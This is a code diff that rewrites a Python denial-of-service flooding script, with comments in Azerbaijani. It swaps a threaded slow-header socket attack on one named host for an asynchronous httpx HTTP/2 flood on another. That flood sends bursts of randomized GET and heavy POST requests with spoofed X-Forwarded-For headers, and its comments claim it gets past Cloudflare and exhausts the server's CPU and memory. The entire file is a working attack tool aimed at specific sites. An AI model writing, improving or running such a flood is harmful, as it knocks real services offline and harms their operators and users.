@@ -1,59 +1,63 @@
-import socket
-import ssl
-import threading
+import asyncio
+import httpx
 import random
 import time
+import string
 
-TARGET_HOST = "www.appl88-vip.com"
-TARGET_PORT = 443
-THREADS = 1500 # Maksimum güc
+TARGET_URL = "https://streamwin.win"
+# Asinxron işlədiyi üçün 1500 worker rahatlıqla işləyəcək
+WORKERS = 800 
 
-def void_worker():
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
+def r_str(n):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
+async def fatal_strike(worker_id, client):
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(5)
+            # Serveri bazadan vurmaq üçün ağır API parametrləri
+            # Bu müraciətlər Cloudflare-i dəlib keçib birbaşa backend-i yorur
+            url = f"{TARGET_URL}?invite_code={random.randint(1000, 9999)}&ttclid=E_C_P_{r_str(40)}&s={r_str(60)}"
             
-            # Bağlantını qururuq
-            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
-            conn.connect((TARGET_HOST, TARGET_PORT))
-            
-            # MULTIPLEXING: Bir bağlantıdan minlərlə "bitməyən" sorğu göndər
-            for _ in range(100):
-                path = f"/?v={random.random()}&id={random.randint(1,99999)}"
-                # Serverə deyirik ki, "mən hələ bitirməmişəm, gözlə"
-                payload = (
-                    f"GET {path} HTTP/1.1\r\n"
-                    f"Host: {TARGET_HOST}\r\n"
-                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0\r\n"
-                    f"Accept: */*\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
-                    f"Content-Length: {random.randint(100, 1000)}\r\n" # Hilə: Datanı göndərmirik, gözlədirik
-                    f"\r\n"
-                ).encode()
-                
-                conn.send(payload)
-                # Serveri kilitləyən o saniyələr:
-                time.sleep(0.1) 
-                
-            time.sleep(10) # Bağlantını 10 saniyə açıq saxla
-            conn.close()
-        except:
-            pass
+            headers = {
+                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0",
+                "Accept-Encoding": "gzip, deflate, br",
+                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}",
+                "X-Requested-With": "XMLHttpRequest",
+                "Connection": "keep-alive"
+            }
 
-def main():
-    print(f"🔥 VOID PROTOCOL INITIALIZED: {TARGET_HOST}")
-    for i in range(THREADS):
-        threading.Thread(target=void_worker, daemon=True).start()
+            # Burst Mode: Hər worker eyni anda 100 paket partladır
+            tasks = []
+            for _ in range(100):
+                # SERVERİN RAM-ını kilitləyən ağır POST
+                if _ % 5 == 0:
+                    tasks.append(client.post(url, headers=headers, content=r_str(1500)))
+                # SERVERİN CPU-sunu kilitləyən GET
+                else:
+                    tasks.append(client.get(url, headers=headers))
+            
+            # Dalğanı serverin prosessoruna çırp!
+            await asyncio.gather(*tasks, return_exceptions=True)
+            
+        except Exception:
+            await asyncio.sleep(0.01)
+
+async def main():
+    print(f"💀 GLOBAL DEVASTATION MODE ACTIVE: {TARGET_URL}")
+    print("[!] Target Origin is being saturated. 520 Status expected.")
     
-    while True:
-        time.sleep(1)
+    # TCP hüdudlarını və bağlantı limitlərini ləğv edirik
+    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
+    
+    async with httpx.AsyncClient(
+        http2=True, # HTTP/2 Rapid Reset effekti (MÜTLƏQDİR)
+        verify=False, 
+        limits=limits, 
+        timeout=10.0
+    ) as client:
+        
+        workers = [fatal_strike(i, client) for i in range(WORKERS)]
+        await asyncio.gather(*workers)
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
